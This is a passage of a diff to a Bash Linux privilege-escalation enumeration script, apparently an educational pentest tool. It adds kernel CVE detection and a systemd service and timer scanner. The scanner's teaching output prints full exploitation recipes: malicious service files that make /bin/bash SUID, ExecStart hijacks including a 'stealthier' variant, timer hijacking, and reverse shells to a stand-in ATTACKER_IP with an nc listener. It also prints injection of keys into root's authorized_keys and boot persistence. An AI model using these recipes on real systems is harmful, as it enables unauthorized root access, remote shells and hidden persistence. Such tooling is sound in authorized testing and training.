+        while IFS='|' read -r sgid_bin perms; do
+            vuln "  $sgid_bin (Permissions: $perms)"
+        done < "$temp_sgid_sudo"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  SUDO GROUP IMPLICATIONS"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT SUDO GROUP MEANS:"
+        teach "  Being in the 'sudo' group typically means you can use sudo."
+        teach "  SGID binaries in this group are less commonly exploitable."
+        teach ""
+        teach "CHECK YOUR SUDO ACCESS:"
+        teach "  sudo -l"
+        teach "  This shows what commands you can run with sudo."
+        teach ""
+        teach "IF YOU HAVE SUDO ACCESS:"
+        teach "  Refer to the SUDO PERMISSIONS section of this script"
+        teach "  for exploitation techniques."
+        log ""
+    fi
+    
+    # PHASE 3: SUMMARY
+    if [ ! -s "$temp_sgid_shadow" ] && [ ! -s "$temp_sgid_docker" ] && \
+       [ ! -s "$temp_sgid_disk" ] && [ ! -s "$temp_sgid_sudo" ]; then
+        ok "No SGID binaries found in dangerous groups (shadow, docker, disk, sudo)"
+    fi
 }
-
 # ═══════════════════════════════════════════════════
 # EXTENDED MODULES (--extended flag)
 # ═══════════════════════════════════════════════════
@@ -5019,7 +5593,6 @@ enum_cron() {
     fi
 }
 
-# === KERNEL EXPLOITS ===
 # === KERNEL EXPLOIT DETECTION ===
 enum_kernel() {
     section "KERNEL EXPLOIT DETECTION"
@@ -5046,8 +5619,33 @@ enum_kernel() {
     
     # === Dirty Pipe (CVE-2022-0847) ===
     if [ "$major" -eq 5 ] && [ "$minor" -ge 8 ] && [ "$minor" -le 16 ]; then
-        critical "Kernel vulnerable to Dirty Pipe (CVE-2022-0847) - Instant root"
+        critical "${WORK}[REQUIRES COMPILATION]${RST} Kernel vulnerable to Dirty Pipe (CVE-2022-0847) - Instant root"
         vuln "Potentially vulnerable to Dirty Pipe (CVE-2022-0847)"
+        
+        # Quick verification check - look for patch indicators
+        info "Performing quick verification check..."
+        local proc_version=$(cat /proc/version 2>/dev/null)
+        local patch_detected=0
+        
+        # Check for common distro patch indicators
+        if echo "$proc_version" | grep -qi "Ubuntu\|Debian\|el7\|el8\|el9\|\.fc[0-9]\+\|\.amzn"; then
+            # These distros commonly backport security patches
+            if echo "$proc_version" | grep -qi "Ubuntu.*5\.1[0-5]\|Ubuntu.*5\.13"; then
+                patch_detected=1
+            elif echo "$proc_version" | grep -qi "\.el[0-9]"; then
+                patch_detected=1
+            fi
+        fi
+        
+        if [ "$patch_detected" -eq 1 ]; then
+            warn "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+            warn "[!] NOTICE: Patch indicators detected in kernel version string"
+            warn "[!] System MAY be patched despite vulnerable version number"
+            warn "[!] Many distributions backport security fixes without version bumps"
+            warn "[!] Manual verification strongly recommended before exploitation"
+            warn "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        fi
+        
         log ""
         teach "╔════════════════════════════════════════════════════════════╗"
         teach "║  CVE-2022-0847 - Dirty Pipe (Arbitrary File Overwrite)"
@@ -5109,6 +5707,26 @@ enum_kernel() {
     # === nf_tables (CVE-2024-1086) ===
     if [ "$major" -eq 5 ] && [ "$minor" -ge 14 ] && [ "$minor" -le 18 ]; then
         vuln "Potentially vulnerable to nf_tables (CVE-2024-1086)"
+        
+        # Quick verification check - CONFIG_USER_NS is required for exploitation
+        info "Performing quick verification check..."
+        local config_file="/boot/config-$(uname -r)"
+        local user_ns_enabled=0
+        
+        if [ -f "$config_file" ]; then
+            local user_ns_config=$(grep "CONFIG_USER_NS" "$config_file" 2>/dev/null)
+            if echo "$user_ns_config" | grep -q "CONFIG_USER_NS=y"; then
+                user_ns_enabled=1
+                critical  "${WORK}[REQUIRES COMPILATION]${RST} System might be vulnerable to CVE-2024-1086 ⚠ CONFIG_USER_NS is ENABLED"
+            else
+                info "✓ CONFIG_USER_NS is DISABLED - system is NOT vulnerable to CVE-2024-1086"
+                info "   (Exploit requires user namespace support which is not enabled)"
+            fi
+        else
+            warn "Could not find kernel config file at $config_file"
+            warn "Unable to verify CONFIG_USER_NS status"
+        fi
+        
         log ""
         teach "╔════════════════════════════════════════════════════════════╗"
         teach "║  CVE-2024-1086 - nf_tables Use-After-Free"
@@ -5181,8 +5799,34 @@ enum_kernel() {
         log ""
         
         if [ "$minor" -le 10 ]; then
-            critical "Kernel vulnerable to DirtyCOW (CVE-2016-5195) - Instant root"
+            critical "${WORK}[REQUIRES COMPILATION]${RST} Kernel vulnerable to DirtyCOW (CVE-2016-5195) - Instant root"
             vuln "Potentially vulnerable to DirtyCOW (CVE-2016-5195)"
+            
+            # Quick verification check - look for patch indicators
+            info "Performing quick verification check..."
+            local proc_version=$(cat /proc/version 2>/dev/null)
+            local patch_detected=0
+            
+            # DirtyCOW was widely patched - check for common indicators
+            if echo "$proc_version" | grep -qi "Ubuntu\|Debian\|el7\|el8\|\.fc[0-9]\+\|\.amzn"; then
+                # Most distros patched this by late 2016
+                patch_detected=1
+            fi
+            
+            # Check for specific Ubuntu/Debian versions that were patched
+            if echo "$proc_version" | grep -qi "Ubuntu.*4\.[48]\|Debian"; then
+                patch_detected=1
+            fi
+            
+            if [ "$patch_detected" -eq 1 ]; then
+                warn "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+                warn "[!] NOTICE: Patch indicators detected in kernel version string"
+                warn "[!] System MAY be patched despite vulnerable version number"
+                warn "[!] DirtyCOW was widely patched in 2016 via backports"
+                warn "[!] Manual verification strongly recommended before exploitation"
+                warn "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+            fi
+            
             log ""
             teach "╔════════════════════════════════════════════════════════════╗"
             teach "║  CVE-2016-5195 - Dirty COW (Copy-On-Write Race Condition)"
@@ -5262,7 +5906,7 @@ enum_kernel() {
     
     # === Kernel 3.x ===
     if [ "$major" -eq 3 ]; then
-        critical "Kernel 3.x - ANCIENT kernel with many known exploits"
+        critical "${WORK}[REQUIRES COMPILATION]${RST} Kernel 3.x - ANCIENT kernel with many known exploits"
         vuln "Extremely outdated kernel - highly exploitable"
         log ""
         teach "╔════════════════════════════════════════════════════════════╗"
@@ -5296,7 +5940,7 @@ enum_kernel() {
     
     # === Kernel 2.x ===
     if [ "$major" -eq 2 ]; then
-        critical "Kernel 2.x - PREHISTORIC kernel - trivial to exploit"
+        critical "${WORK}[REQUIRES COMPILATION]${RST} Kernel 2.x - PREHISTORIC kernel - trivial to exploit"
         vuln "Kernel from the stone age - run exploit suggester"
         log ""
         teach "This kernel is from the early 2000s. It predates most modern"
@@ -5827,38 +6471,741 @@ enum_container() {
     teach "7. If mounted host paths: Modify sensitive files (.ssh/authorized_keys)"
 }
 
-# === SYSTEMD ANALYSIS ===
+# === SYSTEMD SERVICE & TIMER ANALYSIS ===
 enum_systemd() {
-    section "SYSTEMD SERVICE ANALYSIS"
+    section "SYSTEMD SERVICE & TIMER ANALYSIS"
     
-    explain_concept "Systemd Services" \
-        "Systemd manages system services. Writable service files or misconfigured services running as root can be exploited." \
-        "Systemd replaced init scripts. Services defined in .service files specify what runs, as which user, and when. If you can modify a service file that runs as root, you control what root executes on boot or service restart." \
-        "Attack vectors:\n  • Writable .service file\n  • Service executes writable script\n  • Service uses relative paths\n  • Service has weak permissions"
+    # Quick check if systemd is even present
+    if ! command -v systemctl >/dev/null 2>&1; then
+        ok "Systemd not present (using SysV init or other system)"
+        return
+    fi
     
-    # Check for writable service files (must be actually writable, not just symlinks)
-    find /etc/systemd/system /lib/systemd/system -name "*.service" -type f -writable 2>/dev/null | while read service; do
-        # Double-check it's actually writable (not just a symlink artifact)
-        if [ -w "$service" ] && [ ! -L "$service" ]; then
-            critical "Writable systemd service: $service - Modify ExecStart for root execution"
-            vuln "Writable systemd service: $service"
-            teach "Modify this service to run your code as root on next start"
-            teach "  Add: ExecStart=/bin/bash /tmp/evil.sh"
-            teach "  Then: systemctl daemon-reload; systemctl restart \$(basename $service)"
+    # === PHASE 1: SILENT SCAN - Collect all findings ===
+    local found_issues=0
+    local temp_writable_services="/tmp/.learnpeas_systemd_services_$$"
+    local temp_writable_scripts="/tmp/.learnpeas_systemd_scripts_$$"
+    local temp_writable_timers="/tmp/.learnpeas_systemd_timers_$$"
+    local temp_relative_paths="/tmp/.learnpeas_systemd_relative_$$"
+    local temp_restart_services="/tmp/.learnpeas_systemd_restart_$$"
+    local temp_env_files="/tmp/.learnpeas_systemd_env_$$"
+    local temp_writable_dirs="/tmp/.learnpeas_systemd_dirs_$$"
+    local temp_seen_services="/tmp/.learnpeas_systemd_seen_$$"
+    
+    # Cleanup function
+    cleanup_systemd_temps() {
+        rm -f "$temp_writable_services" "$temp_writable_scripts" "$temp_writable_timers" \
+              "$temp_relative_paths" "$temp_restart_services" "$temp_env_files" \
+              "$temp_writable_dirs" "$temp_seen_services" 2>/dev/null
+    }
+    trap cleanup_systemd_temps RETURN
+    
+    # Common service locations
+    local service_dirs=("/etc/systemd/system" "/lib/systemd/system" "/usr/lib/systemd/system" "/run/systemd/system")
+    
+    # Whitelist of known-safe systemd binaries (not exploitable via PATH hijacking)
+    local safe_binaries=(
+        "systemctl" "journalctl" "systemd-" "udevadm" "loginctl" "timedatectl"
+        "hostnamectl" "localectl" "busctl" "coredumpctl" "networkctl"
+        "resolvectl" "bootctl" "machinectl" "portablectl" "userdbctl"
+        "homectl" "oomctl" "systemd-analyze" "systemd-cgls" "systemd-cgtop"
+        "systemd-delta" "systemd-detect-virt" "systemd-escape" "systemd-path"
+        "systemd-run" "systemd-socket-activate" "systemd-stdio-bridge"
+        "rm" "mv" "cp" "cat" "echo" "bash" "sh" "true" "false"
+        "grep" "sed" "awk" "find" "chmod" "chown" "mkdir" "touch"
+        "ssh-keygen" "grub-editenv"
+    )
+    
+    # === CHECK 1: Writable Service Directories ===
+    for service_dir in "${service_dirs[@]}"; do
+        if [ -d "$service_dir" ] && [ -w "$service_dir" ]; then
+            echo "$service_dir" >> "$temp_writable_dirs"
+            found_issues=1
         fi
     done
     
-    # Check for services with writable executables
-    find /etc/systemd/system /lib/systemd/system -name "*.service" 2>/dev/null | while read service; do
-        grep "^ExecStart=" "$service" 2>/dev/null | while read line; do
-            local exec_path=$(echo "$line" | sed 's/ExecStart=//' | awk '{print $1}')
-            if [ -n "$exec_path" ] && [ -w "$exec_path" ]; then
-                vuln "Service $service executes writable file: $exec_path"
+    # === CHECK 2: Writable Service Files (with deduplication) ===
+    for service_dir in "${service_dirs[@]}"; do
+        [ ! -d "$service_dir" ] && continue
+        
+        find "$service_dir" -name "*.service" -type f 2>/dev/null | while read service_file; do
+            # Skip if it's a symlink (common in systemd)
+            [ -L "$service_file" ] && continue
+            
+            # Deduplicate by service name (avoid /lib and /usr/lib duplicates)
+            local service_name=$(basename "$service_file")
+            if grep -q "^${service_name}\$" "$temp_seen_services" 2>/dev/null; then
+                continue
+            fi
+            echo "$service_name" >> "$temp_seen_services"
+            
+            if [ -w "$service_file" ]; then
+                # Check if service runs as root
+                local user=$(grep "^User=" "$service_file" 2>/dev/null | cut -d= -f2)
+                if [ -z "$user" ] || [ "$user" = "root" ]; then
+                    echo "$service_file|root|$service_name" >> "$temp_writable_services"
+                    found_issues=1
+                else
+                    echo "$service_file|$user|$service_name" >> "$temp_writable_services"
+                fi
             fi
         done
     done
+    
+    # === CHECK 3: Services with Writable ExecStart Scripts ===
+    > "$temp_seen_services"  # Reset for script check
+    
+    for service_dir in "${service_dirs[@]}"; do
+        [ ! -d "$service_dir" ] && continue
+        
+        find "$service_dir" -name "*.service" -type f -readable 2>/dev/null | while read service_file; do
+            local service_name=$(basename "$service_file")
+            
+            # Deduplicate
+            if grep -q "^${service_name}\$" "$temp_seen_services" 2>/dev/null; then
+                continue
+            fi
+            echo "$service_name" >> "$temp_seen_services"
+            
+            # Extract ExecStart line
+            grep "^ExecStart=" "$service_file" 2>/dev/null | while read exec_line; do
+                # Extract the script/binary path (remove flags like - + @)
+                local script_path=$(echo "$exec_line" | sed 's/ExecStart=//' | sed 's/^[-+@]*//' | awk '{print $1}')
+                
+                # Skip if empty or doesn't exist
+                [ -z "$script_path" ] || [ ! -e "$script_path" ] && continue
+                
+                # Check if writable
+                if [ -w "$script_path" ]; then
+                    # Check if service runs as root
+                    local user=$(grep "^User=" "$service_file" 2>/dev/null | cut -d= -f2)
+                    if [ -z "$user" ] || [ "$user" = "root" ]; then
+                        echo "$service_name|$service_file|$script_path" >> "$temp_writable_scripts"
+                        found_issues=1
+                    fi
+                fi
+            done
+        done
+    done
+    
+    # === CHECK 4: Writable Timer Files (with deduplication) ===
+    > "$temp_seen_services"  # Reset
+    
+    for service_dir in "${service_dirs[@]}"; do
+        [ ! -d "$service_dir" ] && continue
+        
+        find "$service_dir" -name "*.timer" -type f 2>/dev/null | while read timer_file; do
+            [ -L "$timer_file" ] && continue
+            
+            # Deduplicate by timer name
+            local timer_name=$(basename "$timer_file")
+            if grep -q "^${timer_name}\$" "$temp_seen_services" 2>/dev/null; then
+                continue
+            fi
+            echo "$timer_name" >> "$temp_seen_services"
+            
+            if [ -w "$timer_file" ]; then
+                # Find associated service
+                local service_name=$(grep "^Unit=" "$timer_file" 2>/dev/null | cut -d= -f2)
+                [ -z "$service_name" ] && service_name=$(basename "$timer_file" .timer).service
+                
+                # Check timer schedule
+                local schedule=$(grep "^OnCalendar=\|^OnBootSec=\|^OnUnitActiveSec=" "$timer_file" 2>/dev/null | head -1)
+                
+                echo "$timer_file|$service_name|$schedule" >> "$temp_writable_timers"
+                found_issues=1
+            fi
+        done
+    done
+    
+    # === CHECK 5: Services with SUSPICIOUS Relative Paths (improved logic) ===
+    > "$temp_seen_services"  # Reset
+    
+    for service_dir in "${service_dirs[@]}"; do
+        [ ! -d "$service_dir" ] && continue
+        
+        find "$service_dir" -name "*.service" -type f -readable 2>/dev/null | while read service_file; do
+            local service_name=$(basename "$service_file")
+            
+            # Deduplicate
+            if grep -q "^${service_name}\$" "$temp_seen_services" 2>/dev/null; then
+                continue
+            fi
+            echo "$service_name" >> "$temp_seen_services"
+            
+            # Check if service runs as root
+            local user=$(grep "^User=" "$service_file" 2>/dev/null | cut -d= -f2)
+            [ -n "$user" ] && [ "$user" != "root" ] && continue
+            
+            # Look for ExecStart without leading /
+            grep "^ExecStart=" "$service_file" 2>/dev/null | while read exec_line; do
+                # Skip if it starts with / (absolute path)
+                echo "$exec_line" | grep -qE "ExecStart=[-+@]?/" && continue
+                
+                # Extract binary name (remove flags and arguments)
+                local binary=$(echo "$exec_line" | sed 's/ExecStart=//' | sed 's/^[-+@]*//' | awk '{print $1}')
+                [ -z "$binary" ] && continue
+                
+                # Check if binary is in the safe list
+                local is_safe=0
+                for safe in "${safe_binaries[@]}"; do
+                    if [[ "$binary" == "$safe"* ]]; then
+                        is_safe=1
+                        break
+                    fi
+                done
+                
+                # Only flag if NOT in safe list
+                if [ $is_safe -eq 0 ]; then
+                    # Additional check: does the binary exist in standard paths?
+                    if ! command -v "$binary" >/dev/null 2>&1; then
+                        # Binary doesn't exist in PATH - THIS is suspicious
+                        echo "$service_file|$exec_line|$binary|NOTFOUND" >> "$temp_relative_paths"
+                        found_issues=1
+                    else
+                        # Binary exists but uses relative path - lower severity
+                        local binary_path=$(command -v "$binary" 2>/dev/null)
+                        if [ -w "$binary_path" ] 2>/dev/null; then
+                            # The actual binary is writable - flag this
+                            echo "$service_file|$exec_line|$binary|WRITABLE:$binary_path" >> "$temp_relative_paths"
+                            found_issues=1
+                        fi
+                    fi
+                fi
+            done
+        done
+    done
+    
+    # === CHECK 6: Services with Restart=always (more exploitation chances) ===
+    > "$temp_seen_services"  # Reset
+    
+    for service_dir in "${service_dirs[@]}"; do
+        [ ! -d "$service_dir" ] && continue
+        
+        find "$service_dir" -name "*.service" -type f -readable 2>/dev/null | while read service_file; do
+            local service_name=$(basename "$service_file")
+            
+            # Deduplicate
+            if grep -q "^${service_name}\$" "$temp_seen_services" 2>/dev/null; then
+                continue
+            fi
+            echo "$service_name" >> "$temp_seen_services"
+            
+            if grep -q "^Restart=always" "$service_file" 2>/dev/null; then
+                local user=$(grep "^User=" "$service_file" 2>/dev/null | cut -d= -f2)
+                if [ -z "$user" ] || [ "$user" = "root" ]; then
+                    # Only care if it's enabled
+                    if systemctl is-enabled "$service_name" 2>/dev/null | grep -qE "enabled|static"; then
+                        echo "$service_file|$service_name" >> "$temp_restart_services"
+                    fi
+                fi
+            fi
+        done
+    done
+    
+    # === CHECK 7: Writable EnvironmentFile ===
+    > "$temp_seen_services"  # Reset
+    
+    for service_dir in "${service_dirs[@]}"; do
+        [ ! -d "$service_dir" ] && continue
+        
+        find "$service_dir" -name "*.service" -type f -readable 2>/dev/null | while read service_file; do
+            local service_name=$(basename "$service_file")
+            
+            # Deduplicate
+            if grep -q "^${service_name}\$" "$temp_seen_services" 2>/dev/null; then
+                continue
+            fi
+            echo "$service_name" >> "$temp_seen_services"
+            
+            grep "^EnvironmentFile=" "$service_file" 2>/dev/null | while read env_line; do
+                local env_file=$(echo "$env_line" | cut -d= -f2 | sed 's/^-//')  # Remove optional - prefix
+                
+                if [ -f "$env_file" ] && [ -w "$env_file" ]; then
+                    local user=$(grep "^User=" "$service_file" 2>/dev/null | cut -d= -f2)
+                    if [ -z "$user" ] || [ "$user" = "root" ]; then
+                        echo "$service_file|$service_name|$env_file" >> "$temp_env_files"
+                        found_issues=1
+                    fi
+                fi
+            done
+        done
+    done
+    
+    # === PHASE 2: CONDITIONAL EDUCATION (only if issues found) ===
+    if [ $found_issues -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════════╗"
+        teach "║  SYSTEMD - Understanding Modern Linux Service Management     ║"
+        teach "╚═══════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT IS SYSTEMD:"
+        teach "  Modern Linux init system (replaced SysV init ~2015+)"
+        teach "  Manages: services, timers, sockets, mounts, devices"
+        teach "  Runs as PID 1 with root privileges"
+        teach ""
+        teach "KEY ATTACK SURFACES:"
+        teach "  • .service files → Define WHAT runs and HOW"
+        teach "  • .timer files → Define WHEN services run"
+        teach "  • ExecStart= → The actual command executed"
+        teach "  • User= directive → Who runs it (empty = root)"
+        teach "  • EnvironmentFile= → Variables loaded before execution"
+        teach ""
+        teach "WHY MISCONFIGURATIONS HAPPEN:"
+        teach "  1. Quick deployments → 'Just make it work'"
+        teach "  2. Convenience over security → Scripts in /home with 777"
+        teach "  3. Copy-paste configs → Don't understand what they're doing"
+        teach "  4. Forgotten after setup → 'Set it and forget it' mentality"
+        teach ""
+        teach "EXPLOITATION CHAIN:"
+        teach "  Systemd (root, PID 1) → Reads .service file → Executes ExecStart="
+        teach "  If you control ANY part of this chain → You control root execution"
+        log ""
+    fi
+    
+    # === PHASE 3: REPORT SPECIFIC FINDINGS (BATCHED) ===
+    
+    # Report writable service directories
+    if [ -s "$temp_writable_dirs" ]; then
+        critical "WRITABLE SYSTEMD DIRECTORIES - Create malicious services"
+        log ""
+        
+        while IFS= read -r service_dir; do
+            critical "  → $service_dir"
+        done < "$temp_writable_dirs"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════════╗"
+        teach "║  INSTANT ROOT: Writable Service Directory                    ║"
+        teach "╚═══════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "IMPACT: Total control. Create any service you want."
+        teach ""
+        teach "EXPLOITATION:"
+        teach "  # Pick writable directory from above"
+        teach "  DIR=/etc/systemd/system  # or whichever is writable"
+        teach ""
+        teach "  # Create malicious service"
+        teach "  cat > \$DIR/pwn.service << 'EOF'"
+        teach "  [Unit]"
+        teach "  Description=System Optimizer"
+        teach "  "
+        teach "  [Service]"
+        teach "  Type=oneshot"
+        teach "  ExecStart=/bin/bash -c 'chmod u+s /bin/bash'"
+        teach "  "
+        teach "  [Install]"
+        teach "  WantedBy=multi-user.target"
+        teach "  EOF"
+        teach ""
+        teach "  # Execute"
+        teach "  systemctl daemon-reload"
+        teach "  systemctl start pwn.service"
+        teach "  /bin/bash -p  # Root shell"
+        teach ""
+        teach "ALTERNATIVE PAYLOADS:"
+        teach "  Reverse shell:"
+        teach "    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
+        teach ""
+        teach "  SSH key:"
+        teach "    ExecStart=/bin/bash -c 'mkdir -p /root/.ssh && echo YOUR_KEY >> /root/.ssh/authorized_keys'"
+        teach ""
+        teach "  Persistence (runs on boot):"
+        teach "    Add: WantedBy=multi-user.target to [Install]"
+        teach "    Then: systemctl enable pwn.service"
+        log ""
+    fi
+    
+    # Report writable service files (BATCHED)
+    if [ -s "$temp_writable_services" ]; then
+        critical "WRITABLE SERVICE FILES - Modify ExecStart= for root execution"
+        log ""
+        
+        local root_count=0
+        local user_count=0
+        
+        while IFS='|' read -r service_file user service_name; do
+            if [ "$user" = "root" ]; then
+                critical "  → $service_name (root)"
+                info "     $service_file"
+                root_count=$((root_count + 1))
+            else
+                warn "  → $service_name (user: $user)"
+                info "     $service_file"
+                user_count=$((user_count + 1))
+            fi
+        done < "$temp_writable_services"
+        
+        log ""
+        if [ $root_count -gt 0 ]; then
+            teach "╔═══════════════════════════════════════════════════════════════╗"
+            teach "║  HIGH IMPACT: Direct Service File Modification               ║"
+            teach "╚═══════════════════════════════════════════════════════════════╝"
+            teach ""
+            teach "WHAT YOU CONTROL: The service definition itself"
+            teach ""
+            teach "EXPLOITATION (Choose a service from above):"
+            teach "  SERVICE=/path/to/writable.service  # Pick one above"
+            teach "  SERVICE_NAME=\$(basename \$SERVICE)"
+            teach ""
+            teach "  # Method 1: Replace ExecStart"
+            teach "  cp \$SERVICE \${SERVICE}.bak  # Backup"
+            teach "  sed -i 's|^ExecStart=.*|ExecStart=/bin/bash -c \"chmod u+s /bin/bash\"|' \$SERVICE"
+            teach "  systemctl daemon-reload"
+            teach "  systemctl restart \$SERVICE_NAME"
+            teach "  /bin/bash -p"
+            teach ""
+            teach "  # Method 2: Prepend with ExecStartPre (stealthier)"
+            teach "  sed -i '/^ExecStart=/i ExecStartPre=/bin/bash -c \"chmod u+s /bin/bash\"' \$SERVICE"
+            teach "  systemctl daemon-reload && systemctl restart \$SERVICE_NAME"
+            teach "  # Original service still works = less suspicious"
+            teach ""
+            teach "TIMING:"
+            teach "  • If service running → restart triggers immediately"
+            teach "  • If service stopped → need to start manually OR wait for trigger"
+            teach "  • If timer exists → waits for scheduled time"
+            teach "  • Check status: systemctl status SERVICE_NAME"
+            log ""
+        fi
+        
+        if [ $user_count -gt 0 ]; then
+            warn "Note: Services running as non-root users listed above"
+            info "      Less useful but can still escalate via those user accounts"
+            log ""
+        fi
+    fi
+    
+    # Report writable ExecStart scripts (BATCHED)
+    if [ -s "$temp_writable_scripts" ]; then
+        critical "WRITABLE EXECSTART SCRIPTS - Replace with malicious code"
+        log ""
+        
+        while IFS='|' read -r service_name service_file script_path; do
+            critical "  → $script_path"
+            info "     Service: $service_name"
+        done < "$temp_writable_scripts"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════════╗"
+        teach "║  SCRIPT HIJACKING: Service File Secure, Script Is Not        ║"
+        teach "╚═══════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "SCENARIO: Service file protected, but ExecStart script isn't"
+        teach ""
+        teach "EXPLOITATION (Pick a script from above):"
+        teach "  SCRIPT=/path/to/writable/script.sh  # Pick one"
+        teach "  SERVICE_NAME=service_name  # Match it to the service"
+        teach ""
+        teach "  # Method 1: Prepend payload (keeps functionality)"
+        teach "  cp \$SCRIPT \${SCRIPT}.bak"
+        teach "  cat > /tmp/new << 'EOF'"
+        teach "  #!/bin/bash"
+        teach "  chmod u+s /bin/bash  # Your payload"
+        teach "  EOF"
+        teach "  cat \$SCRIPT >> /tmp/new"
+        teach "  mv /tmp/new \$SCRIPT"
+        teach "  chmod +x \$SCRIPT"
+        teach "  systemctl restart \$SERVICE_NAME"
+        teach ""
+        teach "  # Method 2: Complete replacement (faster)"
+        teach "  cat > \$SCRIPT << 'EOF'"
+        teach "  #!/bin/bash"
+        teach "  chmod u+s /bin/bash"
+        teach "  EOF"
+        teach "  chmod +x \$SCRIPT"
+        teach "  systemctl restart \$SERVICE_NAME"
+        teach ""
+        teach "  # Method 3: Reverse shell"
+        teach "  cat > \$SCRIPT << 'EOF'"
+        teach "  #!/bin/bash"
+        teach "  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
+        teach "  EOF"
+        teach "  chmod +x \$SCRIPT"
+        teach "  # On attacker: nc -lvnp 4444"
+        teach "  systemctl restart \$SERVICE_NAME"
+        log ""
+    fi
+    
+    # Report writable timers (BATCHED)
+    if [ -s "$temp_writable_timers" ]; then
+        critical "WRITABLE SYSTEMD TIMERS - Scheduled privilege escalation"
+        log ""
+        
+        while IFS='|' read -r timer_file service_name schedule; do
+            critical "  → $(basename $timer_file)"
+            info "     Triggers: $service_name"
+            [ -n "$schedule" ] && info "     Schedule: $schedule"
+        done < "$temp_writable_timers"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════════╗"
+        teach "║  TIMER EXPLOITATION: Automated Privilege Escalation          ║"
+        teach "╚═══════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT ARE TIMERS: Systemd's replacement for cron"
+        teach "  OnCalendar=daily → Once per day"
+        teach "  OnCalendar=*:0/10 → Every 10 minutes"
+        teach "  OnBootSec=5min → 5 min after boot"
+        teach ""
+        teach "EXPLOITATION PATHS:"
+        teach ""
+        teach "  Path 1: Modify timer to trigger immediately"
+        teach "    TIMER=/path/to/writable.timer  # Pick from above"
+        teach "    sed -i 's/^OnCalendar=.*/OnBootSec=1sec/' \$TIMER"
+        teach "    sed -i 's/^OnBootSec=.*/OnBootSec=1sec/' \$TIMER"
+        teach "    systemctl daemon-reload"
+        teach "    systemctl start \$(basename \$TIMER)"
+        teach ""
+        teach "  Path 2: Point timer to YOUR malicious service"
+        teach "    # Create malicious service"
+        teach "    cat > /tmp/pwn.service << 'EOF'"
+        teach "    [Service]"
+        teach "    ExecStart=/bin/bash -c 'chmod u+s /bin/bash'"
+        teach "    EOF"
+        teach "    "
+        teach "    # Hijack timer"
+        teach "    sed -i 's|^Unit=.*|Unit=/tmp/pwn.service|' \$TIMER"
+        teach "    systemctl daemon-reload"
+        teach "    systemctl start \$(basename \$TIMER)"
+        teach ""
+        teach "  Path 3: Modify the service that timer triggers"
+        teach "    # Find service: grep Unit= /path/to/timer"
+        teach "    # Then use service exploitation techniques above"
+        teach ""
+        teach "WHY TIMERS ARE VALUABLE:"
+        teach "  • Auto-trigger (no manual restart needed)"
+        teach "  • Persistent (survives after you lose shell)"
+        teach "  • Often forgotten by admins"
+        log ""
+    fi
+    
+    # Report relative paths (BATCHED - only suspicious ones now)
+    if [ -s "$temp_relative_paths" ]; then
+        warn "SUSPICIOUS RELATIVE PATHS IN SERVICES"
+        log ""
+        
+        local notfound_count=0
+        local writable_count=0
+        
+        while IFS='|' read -r service_file exec_cmd binary status; do
+            if [[ "$status" == "NOTFOUND" ]]; then
+                warn "  → Binary NOT FOUND: $binary"
+                info "     Service: $(basename $service_file)"
+                info "     Command: $exec_cmd"
+                notfound_count=$((notfound_count + 1))
+            elif [[ "$status" == WRITABLE:* ]]; then
+                local path="${status#WRITABLE:}"
+                critical "  → Binary is WRITABLE: $binary"
+                info "     Location: $path"
+                info "     Service: $(basename $service_file)"
+                writable_count=$((writable_count + 1))
+            fi
+        done < "$temp_relative_paths"
+        
+        log ""
+        if [ $writable_count -gt 0 ] || [ $notfound_count -gt 0 ]; then
+            teach "╔═══════════════════════════════════════════════════════════════╗"
+            teach "║  PATH HIJACKING: Non-Standard Binary Exploitation            ║"
+            teach "╚═══════════════════════════════════════════════════════════════╝"
+            teach ""
+            
+            if [ $writable_count -gt 0 ]; then
+                teach "WRITABLE BINARIES FOUND:"
+                teach "  The binary itself is writable → Direct replacement attack"
+                teach ""
+                teach "  EXPLOIT:"
+                teach "    BINARY=/path/to/writable/binary  # From above"
+                teach "    cp \$BINARY \${BINARY}.bak"
+                teach "    cat > \$BINARY << 'EOF'"
+                teach "    #!/bin/bash"
+                teach "    chmod u+s /bin/bash"
+                teach "    EOF"
+                teach "    chmod +x \$BINARY"
+                teach "    # Wait for service to run OR systemctl restart SERVICE"
+                teach ""
+            fi
+            
+            if [ $notfound_count -gt 0 ]; then
+                teach "BINARIES NOT FOUND IN PATH:"
+                teach "  Service expects binary but it doesn't exist"
+                teach "  → Create it in a PATH directory"
+                teach ""
+                teach "  EXPLOIT:"
+                teach "    # Check writable PATH dirs"
+                teach "    echo \$PATH | tr ':' '\\n' | while read dir; do"
+                teach "      [ -w \"\$dir\" ] && echo \"Writable: \$dir\""
+                teach "    done"
+                teach ""
+                teach "    # Create malicious binary"
+                teach "    cat > /writable/path/dir/BINARY_NAME << 'EOF'"
+                teach "    #!/bin/bash"
+                teach "    chmod u+s /bin/bash"
+                teach "    EOF"
+                teach "    chmod +x /writable/path/dir/BINARY_NAME"
+                teach ""
+            fi
+            
+            teach "NOTE: Standard systemd binaries (systemctl, journalctl, etc.)"
+            teach "      are NOT vulnerable to PATH hijacking and have been filtered"
+            log ""
+        fi
+    fi
+    
+    # Report services with auto-restart (BATCHED)
+    if [ -s "$temp_restart_services" ]; then
+        info "SERVICES WITH AUTO-RESTART (Restart=always):"
+        log ""
+        
+        local count=0
+        while IFS='|' read -r service_file service_name; do
+            count=$((count + 1))
